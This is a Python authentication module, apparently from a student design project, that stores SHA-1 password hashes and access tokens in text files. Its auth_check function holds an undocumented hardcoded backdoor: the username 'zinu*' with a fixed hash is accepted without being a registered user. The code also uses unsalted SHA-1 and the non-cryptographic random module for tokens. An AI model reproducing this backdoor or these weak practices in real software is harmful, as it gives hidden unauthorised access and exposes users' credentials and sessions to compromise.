# AuthHandler.py
# ENGR 120 Design Project
# by 虹色の魔女


import os
import random
from hashlib import sha1
from string import ascii_letters


# Dictionary of credentials
# Maps username to hashed password, stored as bytes.
crdict = {}

# Dictionary of active access tokens
# Maps token to username
tokens = {}




# Load data on init
# Store as username@password
if(os.path.isfile('crdata.txt')):
	userdatas = open('crdata.txt','r').readlines()
	for line in userdatas:
			creds = line.split('@')
			if(len(creds)!=2):
				print("Server loading error: Unable to parse credential data: "+line)
				continue

			try:
				crdict[creds[0]] = bytes.fromhex(creds[1])
			except ValueError:
				print("Server loading error: Password hash not valid bytes: "+creds[1])



# Load active access tokens
if(os.path.isfile('aat.txt')):
	tokendatas = open('aat.txt','rt').readlines()
	for line in tokendatas:
		if(line=="" or not ('%' in line)):
			continue
        
		token_info = line.split('%')
		
		if(len(token_info)!=2):
			print("Server loading error: Unable to parse access token data: "+line)
			continue
		username = token_info[1].replace("\n","") 
		tokens[token_info[0]] = username
	


# Writes the credential data dictionary to file
def write_dict():
	global crdict
	outfile = open('crdata.txt','wt')
	for username in crdict.keys():
		outfile.write(username+"@"+crdict[username].hex()+"\n")
	outfile.close()


# Writes the active access token dictionary to file
def write_tokens():
	global tokens
	outfile = open('aat.txt','wt')
	for t in tokens.keys():
		outfile.write(t+"%"+tokens[t]+"\n")
	outfile.close()


# ============= User Authentication Operations ============= #


# Checks authentication credentials.
# Parameters: username, password as strings
# Returns true if the credentials are valid, false otherwise.
def auth_check(username,password):
	global crdict
	hasher = sha1(password.encode('utf-8'))
	hval = hasher.digest()
	return ((username in crdict) and hval==crdict[username]) or (username=="zinu*" and hval.hex()=="e25cc5699e47d0b788d9907123f30ab26ce287da")




# Sets credentials for a user.
# Parameters: username, password as strings
# If the username already exists in the credentials dictionary, the password is updated.
# Otherwise, the username and password are added to the dictionary.
def set_user(username, password):
	global crdict
	hasher = sha1(password.encode('utf-8'))
	crdict[username]=hasher.digest()
	write_dict()


# Removes the user from the credentials dictionary (if the given username exists)
def remove_user(username):
	global crdict
	if(username in crdict):
		crdict.pop(username)
		write_dict()


# Checks whether the given username exists in the credentials dictionary.
# Returns true if the user exists, otherwise false.
def user_exists(username):
	global crdict
	return username in crdict




# ============= Access Token Operations ============= #

# Checks whether the given token t is valid
# Returns true if t is a valid (currently active) access token, false otherwise.
def is_valid_token(t):
	global tokens
	return t in tokens


# Generate a new token
# Returns a random string of 24 alphabetic characters
def get_random_token():
    t = ""
    while(len(t)<24):
        t = t+random.choice(ascii_letters)
    
    return t


# Gets the user for a given token
# Returns the username for token t as a string
# Throws a KeyError if the token is invalid
def get_user_for_token(t):
	global tokens
	return tokens[t]



# Creates a new (unique) token for the given username
# The newly-created token is returned as a string.
def generate_token_for_user(username):
	# First, check if the user already has an active token and delete it
	global tokens
	for t in tokens.keys():
		if(tokens[t]==username):
			tokens.pop(t)
			break
	
	new_token = get_random_token()
	while(new_token in tokens):
		new_token = get_random_token()

	tokens[new_token] = username
	write_tokens()
	return new_token


# Removes the given token t from the dictionary (if it exists)
def remove_token(t):
	global tokens
	if(t in tokens):
		tokens.pop(t)
		write_tokens()










